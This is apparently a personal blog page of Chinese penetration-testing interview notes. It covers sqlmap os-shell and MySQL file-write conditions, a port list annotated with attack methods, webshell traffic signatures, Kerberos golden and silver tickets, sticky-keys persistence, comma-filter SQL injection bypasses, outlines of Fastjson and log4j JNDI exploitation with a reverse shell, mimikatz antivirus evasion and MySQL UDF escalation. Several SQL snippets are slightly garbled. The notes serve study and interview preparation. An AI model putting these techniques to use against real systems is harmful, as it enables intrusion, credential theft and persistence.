@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/images/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="各种类型的面试题整理">
+<meta property="og:type" content="article">
+<meta property="og:title" content="面试题整理">
+<meta property="og:url" content="http://example.com/2022/04/03/%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/index.html">
+<meta property="og:site_name" content="Spring&#39;blog">
+<meta property="og:description" content="各种类型的面试题整理">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220403134306981.png">
+<meta property="article:published_time" content="2022-04-03T05:24:45.000Z">
+<meta property="article:modified_time" content="2022-04-09T04:11:58.575Z">
+<meta property="article:author" content="Spring">
+<meta property="article:tag" content="杂识">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220403134306981.png">
+
+<link rel="canonical" href="http://example.com/2022/04/03/%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>面试题整理 | Spring'blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Spring'blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">我还年轻，吃苦趁现在。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">7</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">14</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/03/%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Spring">
+      <meta itemprop="description" content="见到一座山，就想知道山后面是什么。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Spring'blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          面试题整理
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-03 13:24:45" itemprop="dateCreated datePublished" datetime="2022-04-03T13:24:45+08:00">2022-04-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-09 12:11:58" itemprop="dateModified" datetime="2022-04-09T12:11:58+08:00">2022-04-09</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%A2%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">面试</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <div class="post-description">各种类型的面试题整理</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <span id="more"></span>
+
+<h1 id="面试题整理"><a href="#面试题整理" class="headerlink" title="面试题整理"></a>面试题整理</h1><p>自我介绍</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">面试官你好，我叫史博瑞，是19级应界生，来自中北大学软件工程专业的一名学生。在校内通过网安实验室初步学习了解了web渗透的一些基础，后来参加过校内组织的一些ctf比赛，网络安全知识竞赛等。后来自己报名参加过网上的一些web渗透相关培训，有了系统的了解。熟悉常见的web漏洞。还有一些扫漏工具的简单使用。内网方面也了解一些渗透方法和思路。熟悉一些java框架还有中间件的一些漏洞。</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="1-sqlmap-–os-shell原理"><a href="#1-sqlmap-–os-shell原理" class="headerlink" title="1.sqlmap –os-shell原理"></a>1.sqlmap –os-shell原理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.已知网站的绝对路径</span><br><span class="line">2.已知目标站点的脚本语言</span><br><span class="line">3.当前数据库的权限必须是root权限</span><br><span class="line">4.网站不查杀木马文件</span><br><span class="line">5.php主动转义功能关闭</span><br></pre></td></tr></table></figure>
+
+<p>如何获取目标站点的绝对路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.IIS系统，参数恶意传值，使其出现报错</span><br><span class="line">2.TinkPHP访问无效路径，参数恶意传值</span><br><span class="line">3.字典拆解</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-Mysql上传文件的条件"><a href="#2-Mysql上传文件的条件" class="headerlink" title="2.Mysql上传文件的条件"></a>2.Mysql上传文件的条件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.已知目标系统的绝对路径</span><br><span class="line">2.使用into outfile（）进行文件上传</span><br><span class="line">3.mysql数据库身份需要有写文件权限</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-TCP和UDP的区别"><a href="#3-TCP和UDP的区别" class="headerlink" title="3.TCP和UDP的区别"></a>3.TCP和UDP的区别</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.TCP比UDP安全</span><br><span class="line">2.UDP传输速度&gt;TCP,TCP报文长度&gt;UDP</span><br><span class="line">3.TCP面向连接，UDP不需要</span><br><span class="line">4.TCP是点对点，UDP可以一对多</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="4-常见端口的协议"><a href="#4-常见端口的协议" class="headerlink" title="4.常见端口的协议"></a>4.常见端口的协议</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220403134306981.png" alt="image-20220403134306981"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">443 网页浏览端口HTTPS</span><br><span class="line">445 共享文件夹</span><br><span class="line">3306 mysql数据库</span><br><span class="line">1443 mssql数据库</span><br><span class="line">20 21 ftp</span><br><span class="line">拓展：常见端口号</span><br><span class="line">端口号    端口说明    				攻击技巧</span><br><span class="line">21/22/69  ftp/tftp：文件传输协议    爆破\嗅探\溢出\后门</span><br><span class="line">22    	  ssh：远程连接    			爆破OpenSSH；28个退格</span><br><span class="line">23    	  telnet：远程连接    		爆破\嗅探</span><br><span class="line">25    	  smtp：邮件服务    		邮件伪造</span><br><span class="line">53   	  DNS：域名系统    			DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</span><br><span class="line">67/68     dhcp    					劫持\欺骗</span><br><span class="line">110    	  pop3    					爆破</span><br><span class="line">139    	  samba    					爆破\未授权访问\远程代码执行</span><br><span class="line">143    	  imap    					爆破</span><br><span class="line">161    	  snmp      				爆破</span><br><span class="line">389       ldap    					注入攻击\未授权访问</span><br><span class="line">512/513/514 linux r    				直接使用rlogin</span><br><span class="line">873    	  rsync    					未授权访问</span><br><span class="line">1080    socket    					爆破：进行内网渗透</span><br><span class="line">1352    lotus    					爆破：弱口令\信息泄漏：源代码</span><br><span class="line">1433    mssql    					爆破：使用系统用户登录\注入攻击</span><br><span class="line">1521    oracle    					爆破：TNS\注入攻击</span><br><span class="line">2049    nfs    						配置不当</span><br><span class="line">2181    zookeeper    				未授权访问</span><br><span class="line">3306    mysql    					爆破\拒绝服务\注入</span><br><span class="line">3389    rdp    						爆破\Shift后门</span><br><span class="line">4848    glassfish    				爆破：控制台弱口令\认证绕过</span><br><span class="line">5000    sybase/DB2    				爆破\注入</span><br><span class="line">5432    postgresql    				缓冲区溢出\注入攻击\爆破：弱口令</span><br><span class="line">5632    pcanywhere    				拒绝服务\代码执行</span><br><span class="line">5900    vnc    						爆破：弱口令\认证绕过</span><br><span class="line">6379    redis    					未授权访问\爆破：弱口令</span><br><span class="line">7001    weblogic    				Java反序列化\控制台弱口令\控制台部署webshell</span><br><span class="line">80/443/8080    web    				常见web攻击\控制台爆破\对应服务器版本漏洞</span><br><span class="line">8069    zabbix    					远程命令执行</span><br><span class="line">9090    websphere控制台    			爆破：控制台弱口令\Java反序列</span><br><span class="line">9200/9300 elasticsearch    			远程代码执行</span><br><span class="line">11211    memcacache    				未授权访问</span><br><span class="line">27017    mongodb    				爆破\未授权访问</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-http-only的作用，以及如何获取cookie"><a href="#5-http-only的作用，以及如何获取cookie" class="headerlink" title="5.http only的作用，以及如何获取cookie"></a>5.http only的作用，以及如何获取cookie</h2><p>如果在cookie中设置了http only属性，那么将不能从 JS脚本中获取到cookie信息，也就是说不能用 document.cookie()来获取cookie。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.信息泄露，http only是只对指定的cookie做保护，所以前端是会泄露指定保护的cookie</span><br><span class="line">2.配置错误，可能在设置 hettp only的时候只对某个 cookie做了保护，关键的 cookie未保护 </span><br><span class="line">3.如果apache版本较低，使用CVE-2012-0053 ,通过发送超长 cookie，可以获取 http only保护下的cookie</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="6-冰蝎、哥斯拉的流量特征"><a href="#6-冰蝎、哥斯拉的流量特征" class="headerlink" title="6.冰蝎、哥斯拉的流量特征"></a>6.冰蝎、哥斯拉的流量特征</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">冰蝎</span><br><span class="line">1.Accept头application/xhtml+xmlapplication/xmlapplication/signed-exchange属于弱特征</span><br><span class="line">2.内置的一些ua头</span><br><span class="line">3.request.getReader().readLine()读取post请求。请求的Content-Type: application/octet-stream属于强特征。</span><br><span class="line">4.content-length，上传文件，命令执行来讲，加密的参数不定长。但是对于密钥交互，获取基本信息来讲，payload都为定长，且无随机padding</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">哥斯拉</span><br><span class="line">phpshell有三种编码方式</span><br><span class="line">1.EVAL_XOR_BASE64编码连接特征很明显，经过url解码后，pass=eval(base64_decode... 拦截明显的木马特征即可</span><br><span class="line">2.XOR_BASE64编码方式第一个包形式为pass=加密数据，无法检测:(XOR_RAW与其类似，不再单独分析)</span><br><span class="line">3.哥斯拉连接时有一个握手机制，加密前的内容和响应都是固定的，且加密中未填充随机长度字符。故在默认密码和密钥的情况下，内容固定可以检测握手机制包中的请求体和响应体：DlMRWA1cL1gOVDc2MjRhRwZFEQ%3D%3D11cd6a8758984163fL1tMGI4YTljO/79NDQm7r9PZzBiOA==6c37ac826a2a04bc</span><br><span class="line">注意：密钥改变，base加密字符串改变，密码改变，md5加密字符串改变。如果密码和密钥不是默认，可以检测响应体的长度以及构成要素：前后为16位md5值，中间为32位加密字符串。</span><br><span class="line">4.哥斯拉页面配置中的header有三个固定值user-agent,accept,accept-language。该弱特征也可作为检测。</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="7-Kerberos协议，PAC还有黄金票据和白银票据"><a href="#7-Kerberos协议，PAC还有黄金票据和白银票据" class="headerlink" title="7.Kerberos协议，PAC还有黄金票据和白银票据"></a>7.Kerberos协议，PAC还有黄金票据和白银票据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">首先Client向域控制器DC请求访问ServerDC通过去AD活动目录中查找依次区分Client来判断Client是否可信。</span><br><span class="line">认证通过后返回TGT给ClientClient 得到TGT（Ticket Granting Ticket）。</span><br><span class="line">Client继续拿着TGT请求DC访问Server，TGS通过Client消息中的TGT判断Client是否有访问权限。</span><br><span class="line">如果有，则给Client有访问Server的权限Ticket，也叫 ST（Service Ticket）。</span><br><span class="line">Client得到Ticket后，再去访问Server，且该Ticket只针对这一个Server有效。</span><br><span class="line">最终Server和Client建立通信。</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">客户机将明文密码进行NTLM哈希,然后和时间戳一起加密(使用krbtgt密码 hash作为密钥)，发送给kdc(域控)，kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)</span><br><span class="line"></span><br><span class="line">将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中TGT数据</span><br><span class="line"></span><br><span class="line">然后客户机将TGT发送给域控制器KDC请求TGS(票证授权服务。kdc向客户机或server的临时密钥）票证，并且对TGT进行检测</span><br><span class="line"></span><br><span class="line">检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机</span><br></pre></td></tr></table></figure>
+
+
+
+<p>PAC</p>
+<p>KDC向客户机返回AS的时候插入PAC，里边包含用户的 SID、用户所在的组等一些信息。PAC 造成了MS14-068这个漏洞。PAC是用来验证Client的访问权限的，它会被放在TGT里发送给Client，然后由Client发送给TGS。</p>
+<p>区别</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">获取的权限不同</span><br><span class="line">金票：伪造的TGT，可以获取任意Kerberos的访问权限</span><br><span class="line">银票：伪造的TGS，只能访问指定的服务，如CIFS</span><br><span class="line">认证流程不同</span><br><span class="line">金票：同KDC交互，但不同AS交互</span><br><span class="line">银票：不同KDC交互，直接访问Server</span><br><span class="line">加密方式不同</span><br><span class="line">金票：由krbtgt NTLM Hash 加密</span><br><span class="line">银票：由服务账号 NTLM Hash 加密</span><br><span class="line">所以白银票更加隐蔽</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="8-Codeql"><a href="#8-Codeql" class="headerlink" title="8.Codeql"></a>8.Codeql</h2><p>github收购了这个公司。用来解决项目托管的安全问题。而且还开源了一些规则。自动化审计工具。</p>
+<h2 id="9-渗透流程"><a href="#9-渗透流程" class="headerlink" title="9.渗透流程"></a>9.渗透流程</h2><ol>
+<li><p>首先得到人家的许可进行渗透测试</p>
+</li>
+<li><p>信息搜集包括</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.对方服务器的信息（ip、系统类型、版本、开放端口、waf）</span><br><span class="line">2.网站指纹识别（cms、cdn、证书、dns记录）</span><br><span class="line">3.社工whois信息、姓名、备案、邮箱、电话</span><br><span class="line">4.子域名收集、旁站、c段</span><br><span class="line">5.中间件、协议、网站的目录结构</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>漏洞挖掘</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.浏览网站的规模</span><br><span class="line">2.弱口令扫描</span><br><span class="line">3.xss、sql注入、csrf、敏感信息、暴力破解、文件上传、越权漏洞</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>漏洞利用和权限提升</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql提权、mssql、oracle</span><br><span class="line">windows</span><br><span class="line">linux</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>输出报告</p>
+</li>
+</ol>
+<h2 id="10-绕过CDN方法总结"><a href="#10-绕过CDN方法总结" class="headerlink" title="10.绕过CDN方法总结"></a>10.绕过CDN方法总结</h2><ol>
+<li><p>全球ping</p>
+</li>
+<li><p>黑暗引擎（fofa、shodan、钟馗之眼）</p>
+</li>
+<li><p>社工（邮箱）</p>
+</li>
+</ol>
+<h2 id="11-phpinfo你会关注哪些信息"><a href="#11-phpinfo你会关注哪些信息" class="headerlink" title="11.phpinfo你会关注哪些信息"></a>11.phpinfo你会关注哪些信息</h2><ol>
+<li>网站的绝对路径</li>
+<li>看是否有特殊的程序服务（redis、memcache可以ssrfgetshell）</li>
+<li>fastcgi是否开启，有些公开漏洞可以利用</li>
+<li>敏感配置allow_url_include 可用来远程文件包含、disable_functions 用来查看禁用函数。</li>
+</ol>
+<h2 id="12-权限维持"><a href="#12-权限维持" class="headerlink" title="12.权限维持"></a>12.权限维持</h2><p>msf里的use post&#x2F;windows&#x2F;manage&#x2F;sticky_keys</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\sethc.exe 粘滞键 快捷键：按五次 shift 键；</span><br><span class="line">C:\Windows\System32\utilman.exe 设置中心 快捷键：Windows+U 键；</span><br><span class="line">C:\Windows\System32\osk.exe 屏幕键盘</span><br></pre></td></tr></table></figure>
+
+<p>计划任务windows的2007之前的at2008之后的schtaskslinux计划任务为crontab命令</p>
+<h2 id="13-xss之href输出防护"><a href="#13-xss之href输出防护" class="headerlink" title="13.xss之href输出防护"></a>13.xss之href输出防护</h2><p>在输入的时候只允许http和https的协议</p>
+<h2 id="14-samesite防御CSRF的原理"><a href="#14-samesite防御CSRF的原理" class="headerlink" title="14.samesite防御CSRF的原理"></a>14.samesite防御CSRF的原理</h2><p>三个属性</p>
+<p>Lax:b通过超连接访问a，携带a的cookie，b通过img标签访问a，不带cookie，设置的cookie不起作用</p>
+<p>Strict：b通过超连接访问a，不会携带a的cookie，b通过img标签访问a，不带cookie，设置的cookie不起作用。</p>
+<ol>
+<li>get类型的csrf漏洞原本可以用img&#x2F;script等标签进行攻击，但是由于SameSite&#x3D;Lax属性，攻击无效，只能通过访问超连接进行攻击</li>
+<li>post类型的csrf漏洞，ajax可以完成content-type为application&#x2F;x-www-form-urlencoded的csrf攻击，form表单也可以进行攻击，由于SameSite&#x3D;Lax属性，只能通过form表单提交到新页面进行攻击。</li>
+</ol>
+<h2 id="15-json格式的CSRF如何防御"><a href="#15-json格式的CSRF如何防御" class="headerlink" title="15.json格式的CSRF如何防御"></a>15.json格式的CSRF如何防御</h2><ol>
+<li>验证用户，提交数据的时候输入验证码</li>
+<li>验证请求来源的refer</li>
+<li>表单token验证</li>
+</ol>
+<h2 id="16-浏览器解析顺序和解码顺序"><a href="#16-浏览器解析顺序和解码顺序" class="headerlink" title="16.浏览器解析顺序和解码顺序"></a>16.浏览器解析顺序和解码顺序</h2><p>解析顺序</p>
+<ol>
+<li>浏览器接收到响应数据后，解析器先对HTML之类的文档进行解析，构建成DOM节点树，同时，CSS会被CSS解析器解析生成样式表。</li>
+<li>解析html标签过程中遇到<script>标签，则暂停HTML标签解析，控制权转交给<a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/sms?from=10680">JavaScript</a>引擎，执行完后继续解析html，js可以对DOM进行修改。</li>
+</ol>
+<p>解码顺序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">浏览器一般的解码顺序是先进行html解码，再进行javascript解码，最后再进行url解码，需要注意的是这里的url解码和我们发送到服务器的url解码不同，那个过程是由服务器来完成的，而不是浏览器。</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="17-过滤逗号的SQL注入如何绕过过滤limit后的逗号如何绕过"><a href="#17-过滤逗号的SQL注入如何绕过过滤limit后的逗号如何绕过" class="headerlink" title="17.过滤逗号的SQL注入如何绕过过滤limit后的逗号如何绕过"></a>17.过滤逗号的SQL注入如何绕过过滤limit后的逗号如何绕过</h2><p>在使用盲注的时候，需要使用到substr() .mid() ,limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用fromto的方式来解决。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select substr(database(O from 1 for 1);</span><br><span class="line">select mid(database(O from 1 for 1);对于limit可以使用offset来绕过。</span><br><span class="line">select * from news limit 0,1#等价于下面这条SQL语句</span><br><span class="line">select * from news limit 1 offset o小结:使用from可以绕过逗号</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="18-Fastjson漏洞"><a href="#18-Fastjson漏洞" class="headerlink" title="18.Fastjson漏洞"></a>18.Fastjson漏洞</h2><p>提供了autoType功能，允许用户在反序列化数据中通过@type指定反序列化的类型，所以黑客可以构造数据，使目标应用的代码执行流程进入特定的类的settergetter方法中，从而造成攻击。</p>
+<p>反序列化有两种利用方式，rmi(远程方法调用)ldap（轻量级目录访问协议）</p>
+<p>exp 用java编译为class文件上传到VP-s上，然后在目录下运行python -m ip port搭建一个web服务，接受ldap的重定向请求。然后使用github上的一个工具，marshalsec ，maven生成jar包，进入这个工具目录，工具启动ldap服务，然后nc监听。反弹shell。</p>
+<h2 id="19-log4j漏洞"><a href="#19-log4j漏洞" class="headerlink" title="19.log4j漏洞"></a>19.log4j漏洞</h2><p>Apache Log4j 2是一个开源的日志记录组件，使用非常的广泛。黑客通过JNDI注入实现攻击。</p>
+<p>当log4j打印的日志内容中包括 ${jndi:ldap://ip}时，程序就会通过Idap协议访问ip这个地址，然后ip就会返回一个包含Java代码的class文件的地址，然后程序再通过返回的地址下载class文件并执行。</p>
+<p>创建maven项目，导入log4j的依赖，找了一个exp，编译成class文件，开启ldap服务，运行log4j.java,即可成功。</p>
+<h2 id="20-mimikatz免杀"><a href="#20-mimikatz免杀" class="headerlink" title="20.mimikatz免杀"></a>20.mimikatz免杀</h2><ol>
+<li>替换资源+加壳+签名vpm加壳</li>
+</ol>
+<h2 id="21-判断是windows还是linux"><a href="#21-判断是windows还是linux" class="headerlink" title="21.判断是windows还是linux"></a>21.判断是windows还是linux</h2><p>linux大小写敏感，windows大小写不敏感</p>
+<h2 id="22-Mysql两种提权方式"><a href="#22-Mysql两种提权方式" class="headerlink" title="22.Mysql两种提权方式"></a>22.Mysql两种提权方式</h2><p>UDF提权</p>
+<ol>
+<li><p>目标系统是windows</p>
+</li>
+<li><p>拥有mysql的用户账号，可以使用insert、delete权限</p>
+</li>
+<li><p>有root账号密码</p>
